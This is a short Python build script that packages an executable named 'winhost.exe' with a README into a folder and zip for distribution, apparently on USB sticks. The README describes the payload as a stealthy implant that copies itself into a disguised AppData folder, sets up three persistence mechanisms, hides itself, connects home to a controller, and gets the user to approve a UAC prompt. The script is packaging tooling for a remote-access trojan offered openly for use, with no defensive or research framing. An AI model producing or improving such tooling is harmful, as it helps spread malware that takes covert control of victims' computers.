#!/usr/bin/env python3
"""Make SysPy-style distribution kit: ProjectX/ + ProjectX.zip + README.txt"""
import os, shutil, zipfile, time

SRC  = "winhost.exe"
OUT  = "ProjectX"
ZIP  = "ProjectX.zip"
README = """PROJECT X - how to run
========================

1. Copy this whole folder anywhere (USB stick is fine).
2. Double-click winhost.exe
3. Nothing happens. That is correct.

It copies itself to  %APPDATA%\\Microsoft\\WindowsHost\\
sets up three persistence vectors, hides itself, and connects home.
One UAC prompt may appear the first time - click Yes.

Verify it is running:
  * Task Manager -> Details -> look for winhost.exe
  * %APPDATA%\\Microsoft\\  (folder is hidden by default)

Remove it:
  double-click winhost.exe --uninstall
  or from the controller:  nuke
"""

def main():
    # build.bat writes to dist/, CI writes to ./ - accept either, and read the
    # bytes BEFORE wiping OUT (the old version deleted the file it needed).
    src = SRC if os.path.exists(SRC) else os.path.join("dist", SRC)
    if not os.path.exists(src):
        print(f"[!] {SRC} not found - run build.bat first"); return 1
    data = open(src, "rb").read()
    shutil.rmtree(OUT, ignore_errors=True)
    os.makedirs(OUT, exist_ok=True)
    open(os.path.join(OUT, SRC), "wb").write(data)
    open(os.path.join(OUT, "README.txt"), "w").write(README)
    with zipfile.ZipFile(ZIP, "w", zipfile.ZIP_DEFLATED) as z:
        for f in os.listdir(OUT):
            z.write(os.path.join(OUT, f), f)
    print(f"[+] {OUT}/ and {ZIP}  ({os.path.getsize(ZIP)/1024:.0f} KB)  {time.strftime('%Y-%m-%d')}")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
